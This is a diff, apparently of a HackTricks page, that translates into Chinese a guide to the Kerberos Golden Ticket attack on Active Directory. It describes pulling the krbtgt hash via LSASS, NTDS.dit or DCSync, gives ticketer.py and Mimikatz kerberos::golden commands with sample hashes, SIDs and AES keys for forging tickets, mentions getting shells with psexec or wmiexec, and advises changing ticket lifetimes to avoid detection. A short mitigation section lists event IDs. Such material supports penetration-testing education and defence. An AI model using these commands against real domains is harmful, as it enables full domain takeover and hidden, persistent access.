@@ -4,12 +4,11 @@
 
 ## Golden ticket
 
-A **Golden Ticket** attack consist on the **creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user** through the use of the **NTLM hash of the Active Directory (AD) krbtgt account**. This technique is particularly advantageous because it **enables access to any service or machine** within the domain as the impersonated user. It's crucial to remember that the **krbtgt account's credentials are never automatically updated**.
+**Golden Ticket** 攻击是指通过使用 **Active Directory (AD) krbtgt 账户的 NTLM 哈希** 来 **创建一个合法的票据授权票 (TGT)，冒充任何用户**。这种技术特别有利，因为它 **使冒充的用户能够访问域内的任何服务或机器**。重要的是要记住，**krbtgt 账户的凭据从不自动更新**。
 
-To **acquire the NTLM hash** of the krbtgt account, various methods can be employed. It can be extracted from the **Local Security Authority Subsystem Service (LSASS) process** or the **NT Directory Services (NTDS.dit) file** located on any Domain Controller (DC) within the domain. Furthermore, **executing a DCsync attack** is another strategy to obtain this NTLM hash, which can be performed using tools such as the **lsadump::dcsync module** in Mimikatz or the **secretsdump.py script** by Impacket. It's important to underscore that to undertake these operations, **domain admin privileges or a similar level of access is typically required**.
+要 **获取 krbtgt 账户的 NTLM 哈希**，可以采用多种方法。它可以从 **本地安全授权子系统服务 (LSASS) 进程** 或位于域内任何域控制器 (DC) 上的 **NT 目录服务 (NTDS.dit) 文件** 中提取。此外，**执行 DCsync 攻击** 是获取此 NTLM 哈希的另一种策略，可以使用 **Mimikatz 中的 lsadump::dcsync 模块** 或 **Impacket 的 secretsdump.py 脚本** 来执行。需要强调的是，进行这些操作通常需要 **域管理员权限或类似级别的访问权限**。
 
-Although the NTLM hash serves as a viable method for this purpose, it is **strongly recommended** to **forge tickets using the Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)** for operational security reasons.
-
+尽管 NTLM 哈希作为此目的的可行方法，但 **强烈建议** 使用 **高级加密标准 (AES) Kerberos 密钥 (AES128 和 AES256)** 来 **伪造票据，以确保操作安全**。
 ```bash:From Linux
 python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
 export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
@@ -25,41 +24,37 @@ klist #List tickets in memory
 # Example using aes key
 kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
 ```
+**一旦**你注入了**金票**，你可以访问共享文件**(C$)**，并执行服务和WMI，因此你可以使用**psexec**或**wmiexec**来获取一个shell（看起来你无法通过winrm获取shell）。
 
-**Once** you have the **golden Ticket injected**, you can access the shared files **(C$)**, and execute services and WMI, so you could use **psexec** or **wmiexec** to obtain a shell (looks like yo can not get a shell via winrm).
+### 绕过常见检测
 
-### Bypassing common detections
-
-The most frequent ways to detect a golden ticket are by **inspecting Kerberos traffic** on the wire. By default, Mimikatz **signs the TGT for 10 years**, which will stand out as anomalous in subsequent TGS requests made with it.
+检测金票的最常见方法是通过**检查网络上的Kerberos流量**。默认情况下，Mimikatz**将TGT签名为10年**，这在后续使用它的TGS请求中会显得异常。
 
 `Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`
 
-Use the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).
-
+使用`/startoffset`、`/endin`和`/renewmax`参数来控制开始偏移、持续时间和最大续订（均以分钟为单位）。
 ```
 Get-DomainPolicy | select -expand KerberosPolicy
 ```
+不幸的是，TGT 的生命周期不会在 4769 中记录，因此您无法在 Windows 事件日志中找到此信息。然而，您可以关联的是 **看到 4769 而没有先前的 4768**。**没有 TGT 是无法请求 TGS 的**，如果没有记录显示 TGT 被发放，我们可以推断它是离线伪造的。
 
-Unfortunately, the TGT's lifetime is not logged in 4769's, so you won't find this information in the Windows event logs. However, what you can correlate is **seeing 4769's without a prior 4768**. It's **not possible to request a TGS without a TGT**, and if there is no record of a TGT being issued, we can infer that it was forged offline.
-
-In order to **bypass this detection** check the diamond tickets:
+为了 **绕过此检测**，请检查 diamond tickets：
 
 {{#ref}}
 diamond-ticket.md
 {{#endref}}
 
-### Mitigation
+### 缓解措施
 
-- 4624: Account Logon
-- 4672: Admin Logon
+- 4624: 账户登录
+- 4672: 管理员登录
 - `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`
 
-Other little tricks defenders can do is **alert on 4769's for sensitive users** such as the default domain administrator account.
+防御者可以做的其他小技巧是 **对敏感用户的 4769 发出警报**，例如默认域管理员账户。
 
-## References
+## 参考文献
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
 
 {{#include ../../banners/hacktricks-training.md}}
-
